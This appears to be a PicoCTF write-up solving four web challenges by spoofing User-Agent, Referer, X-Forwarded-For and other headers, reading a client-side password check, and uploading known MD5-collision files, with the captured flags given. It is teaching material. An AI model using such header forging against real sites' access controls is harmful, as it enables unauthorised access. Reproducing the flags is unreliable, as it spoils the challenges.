# PicoCTF

## Web Exploitation

##### Problem
###### Who are you?
> Description
> This website can be rendered only by picobrowser, go and catch the flag! https://jupiter.challenges.picoctf.org/problem/50522/ (link) or http://jupiter.challenges.picoctf.org:50522

By running the following `curl` command we can see the page provides the information we are looking at:

```
curl -v http://jupiter.challenges.picoctf.org:50522/
```
Output:

```
       <div class="jumbotron">
            <p class="lead"></p>
            <p><a href="/flag" class="btn btn-lg btn-success btn-block"> Flag</a></p>
        </div>
```

##### Solution

To collect the flag, you need to run
```
curl -v -A picobrowser http://jupiter.challenges.picoctf.org:50522/flag

```
**FLAG**
```
picoCTF{p1c0_s3cr3t_ag3nt_51414fa7}

```


##### Problem
###### Who are you?
> Description
> Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:34588/

By visiting the page, one gets the following: "Only people who use the official PicoBrowser are allowed on this site!"

##### Solution

Sending the User-Agent as `PicoBrowser`, do not simple solve the issue.

```sh
curl -v -i -A "PicoBrowser" http://mercury.picoctf.net:34588/
```

```html
                <div class="row">
                        <div class="col-xs-12 col-sm-12 col-md-12">
                                <h3 style="color:red">I don&#39;t trust users visiting from another site.</h3>
                        </div>
                </div>
```

Sending Referer HEADER field

```sh
curl -v -i -A "PicoBrowser" -H "Referer: http://mercury.picoctf.net:34588/" http://mercury.picoctf.net:34588/
```
```html
                <div class="row">
                        <div class="col-xs-12 col-sm-12 col-md-12">
                                <h3 style="color:red">Sorry, this site only worked in 2018.</h3>
                        </div>
                </div>
```

I had to try different HEADER options regarding age. The output changed when I used `max-age` and `Date`.

```sh
curl -v -i -A "PicoBrowser" -H "Referer: http://mercury.picoctf.net:34588/" -H "max-age: 2018" -H "Date: 2018" http://mercury.picoctf.net:34588/
```
```html
                <div class="row">
                        <div class="col-xs-12 col-sm-12 col-md-12">
                                <h3 style="color:red">I don&#39;t trust users who can be tracked.</h3>
                        </div>
                </div>
```

They were using an old `Do Not Track (DNT)` which accepts value 1 if client don't want to be tracked.
```sh
curl -v -i -A "PicoBrowser" -H "Referer: http://mercury.picoctf.net:34588/" -H "max-age: 2018" -H "Date: 2018" -H "DNT: 1" http://mercury.picoctf.net:34588/
```
```html
                <div class="row">
                        <div class="col-xs-12 col-sm-12 col-md-12">
                                <h3 style="color:red">This website is only for people from Sweden.</h3>
                        </div>
                </div>
```

I must admit that I have almost gave up on this one, since I have tried `Accept-Language`, `Content-Language` and many other ones related to language. I also tried `CountryCode`, `Country`, `IP` and other few ones. 

I tried `http IP header` in the Web Search and the result came: The `X-Forwarded-For` (XFF) HTTP header field is a common method for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or load balancer.

Let's try this one by using the IP range from Sweden. I have found an IP here: https://lite.ip2location.com/sweden-ip-address-ranges


```sh
curl -v -i -A "PicoBrowser" -H "Referer: http://mercury.picoctf.net:34588/" -H "max-age: 2018" -H "Date: 2018" -H "DNT: 1" -H "X-Forwarded-For: 2.16.66.1" http://mercury.picoctf.net:34588/
```
```html
                <div class="row">
                        <div class="col-xs-12 col-sm-12 col-md-12">
                                <h3 style="color:red">You&#39;re in Sweden but you don&#39;t speak Swedish?</h3>
                        </div>
                </div>
```

Now the process is easy!

```sh
curl -v -i -A "PicoBrowser" -H "Referer: http://mercury.picoctf.net:34588/" -H "max-age: 2018" -H "Date: 2018" -H "DNT: 1" -H "X-Forwarded-For: 2.16.66.1" -H "Accept-Language: sv-SE" http://mercury.picoctf.net:34588/
```

**FLAG**
```
picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_79e451a7}

```


##### Problem
###### dont-use-client-side
> Description
> Can you break into this super secure portal? https://jupiter.challenges.picoctf.org/problem/29835/ (link) or http://jupiter.challenges.picoctf.org:29835

##### Solution

To capture the flag one needs to `Enter valid credentials to proceed`. There is a JavaScript that checks for that.

```js
  function verify() {
    checkpass = document.getElementById("pass").value;
    split = 4;
    if (checkpass.substring(0, split) == 'pico') {
      if (checkpass.substring(split*6, split*7) == '723c') {
        if (checkpass.substring(split, split*2) == 'CTF{') {
         if (checkpass.substring(split*4, split*5) == 'ts_p') {
          if (checkpass.substring(split*3, split*4) == 'lien') {
            if (checkpass.substring(split*5, split*6) == 'lz_7') {
              if (checkpass.substring(split*2, split*3) == 'no_c') {
                if (checkpass.substring(split*7, split*8) == 'e}') {
                  alert("Password Verified")
                  }
                }
              }
            }
          }
        }
      }
    }
```

You just have to follow the white rabbit. First part the string is  `substring(0, split) == 'pico')`. Second is `substring(split, split*2) == 'CTF{')`. Third is `substring(split*2, split*3) == 'no_c')`. Forth part is `substring(split*3, split*4) == 'lien')`, so on so forth, and final part denotes `substring(split*7, split*8) == 'e}')`.


**FLAG**

```
picoCTF{no_clients_plz_7723ce}
```

##### Problem
###### It is my Birthday
> Description
> I sent out 2 invitations to all of my friends for my birthday! I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn't believe how long it took me to find a collision. Anyway, see if you're invited by submitting 2 PDFs to my website. http://mercury.picoctf.net:48746/

##### Solution

This web application is vulrnable to the idea of MD5 collision. Basically, to solve this challenge one needs to send _two_ files that generates the same hash output.

I dowloaded the following files from: https://www.mathstat.dal.ca/~selinger/md5collision/

```sh
# first file
curl -O https://www.mathstat.dal.ca/~selinger/md5collision/erase
cp erase 1.pdf

# second file
curl -O https://www.mathstat.dal.ca/~selinger/md5collision/hello
cp hello 2.pdf
```

Now, upload `1.pdf` and `2.pdf`. You will receive the flag:

**FLAG**
```php
// FLAG: picoCTF{c0ngr4ts_u_r_1nv1t3d_aebcbf39}
```
